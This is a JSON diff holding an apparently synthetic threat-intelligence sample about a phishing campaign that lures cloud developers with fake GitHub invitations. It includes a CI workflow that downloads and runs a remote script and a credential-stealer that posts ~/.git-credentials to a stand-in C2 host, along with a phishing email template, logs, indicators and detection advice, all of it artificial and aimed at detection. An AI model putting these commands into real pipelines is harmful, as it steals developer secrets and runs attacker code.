@@ -1,0 +1,71 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Cloud",
+        "nature": "phishing"
+      },
+      "example": {
+        "scenario": "Phishing campaign targets cloud developers with fake GitHub repository invitations containing malicious CI/CD workflow files that download and execute credential-stealing payloads on build agents.",
+        "technical_data": {
+          "email_headers": "Return-Path: <no-reply@gitservice-update.com>\r\nReceived: from mail.gitservice-update.com (mail.gitservice-update.com [198.51.100.45])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 1234567890\r\n\tfor <devteam@enterprise.com>; Tue, 18 Apr 2024 10:22:15 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of no-reply@gitservice-update.com designates 198.51.100.45 as permitted sender) receiver=enterprise.com; client-ip=198.51.100.45; envelope-from=no-reply@gitservice-update.com; helo=mail.gitservice-update.com;\r\nAuthentication-Results: enterprise.com; dkim=pass (signature was verified) header.d=gitservice-update.com\r\nFrom: GitHub Notifications <no-reply@gitservice-update.com>\r\nTo: devteam@enterprise.com\r\nSubject: [GitHub] Invitation to collaborate on new repository \"cloud-utils\"\r\nDate: Tue, 18 Apr 2024 10:22:15 -0400\r\nMessage-ID: <CAJdW9XfY1pXLZedLzM0@mail.gitservice-update.com>\r\nX-Mailer: PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+          "email_body": "Hello Developer,\n\nYou have been invited to collaborate on the GitHub repository \"cloud-utils\". Click the link below to accept the invitation:\n\nhttps://gitservice-update.com/invite?repo=cloud-utils&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZGV2dGVhbSIsInJlcG8iOiJjbG91ZC11dGlscyIsImlhdCI6MTY4MTI3MTYwMCwiZXhwIjoxNjgxMjc1MjAwfQ._fWzq5V0QjJkR9WqUqP8Zg1v1Vb7Q6bRzTkcYzO4QyM\n\nThank you,\nGitHub Team",
+          "smtp_transaction_log": "220 mail.gitservice-update.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.gitservice-update.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<no-reply@gitservice-update.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<devteam@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: GitHub Notifications <no-reply@gitservice-update.com>\r\nTo: devteam@enterprise.com\r\nSubject: [GitHub] Invitation to collaborate on new repository \"cloud-utils\"\r\n\r\nHello Developer,\n\nYou have been invited... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 1234567890\r\nQUIT\r\n221 2.0.0 Bye",
+          "domain_registration": {
+            "domain": "gitservice-update.com",
+            "registrar": "NameCheap, Inc.",
+            "creation_date": "2024-03-15T12:34:56Z",
+            "expiration_date": "2025-03-15T12:34:56Z",
+            "registrant": {
+              "name": "Privacy Protect LLC",
+              "organization": "Privacy Protect, LLC",
+              "email": "contact@privacyprotect.org",
+              "address": "123 Privacy St, Wilmington, DE, US"
+            },
+            "name_servers": [
+              "ns1.namecheap-dns.com",
+              "ns2.namecheap-dns.com"
+            ]
+          },
+          "malicious_repo_structure": {
+            "files": [
+              {
+                "path": ".github/workflows/ci.yml",
+                "content": "name: CI Build\n\non: [push, pull_request]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v3\n    - name: Install dependencies\n      run: |\n        sudo apt-get update && sudo apt-get install -y curl\n    - name: Download payload\n      run: |\n        curl -o /tmp/credstealer.sh https://malicious-cdn.com/payloads/credstealer.sh\n        chmod +x /tmp/credstealer.sh\n        /tmp/credstealer.sh\n"
+              }
+            ]
+          },
+          "credstealer_sh_payload": "#!/bin/bash\n# Simulated credential stealer for demonstration\ncurl -X POST -H \"Content-Type: application/json\" -d '{\"token\": \"'$(cat ~/.git-credentials)'\"}' https://malicious-c2.example.com/collect\n",
+          "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE1234\",\n    \"arn\": \"arn:aws:iam::123456789012:user/developer1\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"developer1\"\n  },\n  \"eventTime\": \"2024-04-18T14:22:35Z\",\n  \"eventSource\": \"codecommit.amazonaws.com\",\n  \"eventName\": \"PutRepositoryTriggers\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"198.51.100.45\",\n  \"userAgent\": \"GitHub Actions\",\n  \"requestParameters\": {\n    \"repositoryName\": \"cloud-utils\",\n    \"triggers\": [\n      {\n        \"name\": \"malicious-trigger\",\n        \"destinationArn\": \"arn:aws:sns:us-east-1:123456789012:malicious-topic\",\n        \"customData\": \"malicious\"\n      }\n    ]\n  },\n  \"responseElements\": null,\n  \"requestID\": \"abcdef12-3456-7890-abcd-ef1234567890\",\n  \"eventID\": \"123e4567-e89b-12d3-a456-426614174000\",\n  \"readOnly\": false,\n  \"resources\": [\n    {\n      \"ARN\": \"arn:aws:codecommit:us-east-1:123456789012:cloud-utils\",\n      \"accountId\": \"123456789012\",\n      \"type\": \"AWS::CodeCommit::Repository\"\n    }\n  ]\n}",
+          "network_packet_capture": "Frame 42: 608 bytes on wire (4864 bits), 608 bytes captured (4864 bits)\nEthernet II, Src: 02:42:ac:11:00:02, Dst: 00:0c:29:6b:4c:2d\nInternet Protocol Version 4, Src: 198.51.100.45, Dst: 10.0.0.12\nTransmission Control Protocol, Src Port: 443, Dst Port: 53720, Seq: 1, Ack: 1, Len: 512\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nGET /payloads/credstealer.sh HTTP/1.1\r\nHost: malicious-cdn.com\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n",
+          "process_creation_log": "[2024-04-18T14:23:01Z] user=developer1 pid=7845 parent_pid=7830 cmdline=\"/bin/bash /tmp/credstealer.sh\"\n[2024-04-18T14:23:02Z] user=developer1 pid=7846 parent_pid=7845 cmdline=\"curl -X POST -H 'Content-Type: application/json' -d '{\\\"token\\\": \\\"***redacted***\\\"}' https://malicious-c2.example.com/collect\""
+        },
+        "indicators": {
+          "phishing_domain": "gitservice-update.com",
+          "malicious_c2_domain": "malicious-c2.example.com",
+          "malicious_cdn_domain": "malicious-cdn.com",
+          "suspicious_ci_cd_file": ".github/workflows/ci.yml",
+          "payload_sha256": "4d2d1e9f2a6c8f3f5abbc1e2f5d0e8b7a1c03f6e4f7b8d9e2a3f4c5b6d7e8f9a",
+          "malicious_smtp_ip": "198.51.100.45",
+          "cloudtrail_event_name": "PutRepositoryTriggers",
+          "suspicious_process_command": "/bin/bash /tmp/credstealer.sh"
+        },
+        "detection_method": "Detect anomalous or new GitHub invitation email domains and verify legitimacy via secondary channels. Monitor CI/CD pipeline files for newly added or modified workflow YAML files containing external downloads or execution of scripts. Alert on outbound network connections to rare or newly seen domains from build agents, especially HTTP(S) downloads from unknown CDNs. CloudTrail logs should be monitored for unexpected repository trigger modifications or permission changes. Endpoint monitoring should flag creation and execution of scripts in temporary directories with suspicious outbound HTTP POST traffic to external IPs or domains.",
+        "relevant_mitre_techniques": [
+          "T1566.001",
+          "T1190",
+          "T1059.004",
+          "T1071.001",
+          "T1078",
+          "T1609"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample aligns very well with the stated problem of phishing targeting cloud developers via fake code repository invitations containing malicious payloads. The scenario clearly describes a phishing campaign using fake GitHub invitations that include malicious CI/CD workflow files executing credential-stealing scripts, which matches the problem nature. The technical data is comprehensive and realistic, including email headers, SMTP logs, domain registration details showing a recently created suspicious domain, malicious repository structure with a CI workflow downloading and executing a payload, network captures of the payload download, process creation logs showing execution of the malicious script, and CloudTrail logs indicating suspicious repository trigger modifications. Indicators are clearly identified and correspond to the malicious elements described. The detection method is thorough and directly addresses the risk reduction strategies mentioned in the problem description, such as verifying invitation legitimacy, scanning CI/CD pipelines, monitoring network traffic, and endpoint behavior. Relevant MITRE ATT&CK techniques are appropriately selected and cover phishing, code execution, command and control, and credential access. Overall, the sample is complete, realistic, and correctly represents the problem scenario with detailed supporting evidence and detection guidance."
+      }
+    }
+  ]
+}
